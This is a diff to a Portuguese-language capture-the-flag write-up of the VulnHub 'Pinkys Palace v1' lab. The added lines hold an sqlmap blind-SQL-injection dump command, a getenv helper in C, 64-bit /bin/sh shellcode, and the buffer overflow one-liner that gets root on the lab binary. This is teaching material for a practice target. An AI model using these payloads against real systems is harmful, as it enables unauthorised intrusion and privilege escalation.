@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Pinkys Palace v1"
-tags: [Linux, Medium]
+tags: [Linux, Medium, Blind SQLi, Wfuzz, Gobuster, Curl, Upstream Proxy, BurpSuite, BurpSuite Repeater, Buffer Overflow Linux]
 categories: VulnHub OSCP
 ---
 
@@ -253,7 +253,7 @@ Aqui pra ganhar tempo (e porque também não dei conta de fazer na mão) vou usa
 Demora muito tempo pra realizar essa extração, por ser blind ele é mais lento que o normal
 
 ```bash
-
+sqlmap --proxy=http://192.168.56.138:31337 –dbms=mysql –data="user=admin&pass=password&submit=Login" --url http://127.0.0.1:8080/littlesecrets-main/login.php --level=5 --risk=3 --dump users
 ```
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/sqlmap.png)
@@ -362,7 +362,7 @@ Vamos fazer o buffer overflow nessa aplicação então
 
 Vamos tentar explicar passo a passo como funciona essa exploração de buffer overflow em linux, a ideia é a mesma do windows, devemos encontrar o EIP, sobrescrever ele e assim ganhar acesso à áreas da memória que teoricamente não deveríamos ter acesso
 
-1. Abrimos ele com o `gdb` mais especificamente o `gef`
+1 - Abrimos ele com o `gdb` mais especificamente o `gef`
 
 ```bash
 gdb ./adminhelper
@@ -370,13 +370,13 @@ gdb ./adminhelper
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf.png)
 
-2. Verificar as proteções que esse binário tem, com o comando `checksec`
+2 - Verificar as proteções que esse binário tem, com o comando `checksec`
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf1.png)
 
 Obs: uma coisa pra se notar é que ele não está com o NX habilitado, ou seja, podemos executar shellcode diretamente na stack.
 
-3. Devemos reproduzir o segmentation fault da aplicação, pra verificar o momento exato em que ele perde o controle da aplicação
+3 - Devemos reproduzir o segmentation fault da aplicação, pra verificar o momento exato em que ele perde o controle da aplicação
 
 Criaremos um `pattern` de 100 bytes
 
@@ -386,7 +386,7 @@ pattern create 100
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf2.png)
 
-4. Rodamos esse pattern na aplicação, pra verificarmos o que estará no EIP no momento do crash
+4 - Rodamos esse pattern na aplicação, pra verificarmos o que estará no EIP no momento do crash
 
 ```bash
 r 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
@@ -396,7 +396,7 @@ r 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaa
 
 O rbp apareceu com a string `jaaaaaaakaaaaaaalaaaaaaamaaa`
 
-5. Descobrimos o momento exato do crash
+5 - Descobrimos o momento exato do crash
 
 ```bash
 pattern offset 'jaaaaaaakaaaaaaalaaaaaaamaaa'
@@ -404,7 +404,7 @@ pattern offset 'jaaaaaaakaaaaaaalaaaaaaamaaa'
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf4.png)
 
-6. Criamos o offset em python pra comprovarmos o crash
+6 - Criamos o offset em python pra comprovarmos o crash
 
 ```bash
 python -c "print 'A'*72"
@@ -416,5 +416,50 @@ E comprovamos o crash
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf6.png)
 
-7. Jogamos o shellcode ali dentro dele, nesse espaço de memória pra ser executado
+7 - Jogamos o shellcode ali dentro dele, nesse espaço de memória pra ser executado
+
+Agora que podemos controlar o RIP com um offset de 72 bytes, vamos jogar nosso shellcode em uma variável de ambiente para determinar o endereço de memória da variável de ambiente, onde o shellcode vai estar. Esse vai ser nosso endereço de retorno do exploit
+
+getenv.c
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char *ptr;
+
+    if(argc < 3) {
+        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+        exit(0);
+    }
+    ptr = getenv(argv[1]); /* get env var location */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+    printf("%s will be at %p\n", argv[1], ptr);
+}
+```
+
+Uma vez que estamos usando uma variável de ambiente para guardar nosso payload, o tamanho dele não importa. Mesmo assim eu prefiro sempre usar o menor possível (de 64-bit), esse vai ser 27 bytes, que vai executar o /bin/sh
+
+`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`
+
+Jogamos o `getenv.c` para dentro da máquina, e compilamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf7.png)
+
+Agora executamos e viramos root
+
+```bash
+export PWN=$(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
+./getenv PWN ./adminhelper
+./adminhelper $(python -c "print 'A'*72+'\xc7\xee\xff\xff\xff\x7f'")
+```
+
+Com o getenv, descobrimos qual é o endereço de memória que o shellcode vai estar guardado, e com o controle que temos no binário, podemos explorar isso e virar root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf8.png)
+
+Pegamos a flag de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/flag.png)
 
